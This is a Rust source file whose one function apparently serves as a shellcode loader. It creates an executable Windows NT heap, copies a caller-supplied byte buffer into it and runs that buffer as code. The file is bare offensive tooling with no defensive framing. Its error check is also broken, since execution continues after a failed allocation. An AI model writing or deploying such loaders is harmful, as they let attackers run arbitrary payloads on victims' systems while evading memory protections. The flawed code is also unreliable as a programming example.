use std::ffi::c_void;
use std::intrinsics::{copy, transmute};

use windows::Wdk::Storage::FileSystem::{RtlAllocateHeap, RtlCreateHeap};

pub async fn nt_heap_alloc(qi: Vec<u8>) {
    unsafe {
        let handle = RtlCreateHeap(0x00040000 | 0x00000002, None, qi.len(), qi.len(), None, None);
        let alloc = RtlAllocateHeap(handle, 0x00000008, qi.len());
        if alloc.is_null() {
            eprintln!("Memory allocation failed");
        }
        copy(qi.as_ptr(), alloc as *mut u8, qi.len());
        let exec = transmute::<*mut c_void, fn()>(alloc);
        exec();
    }
}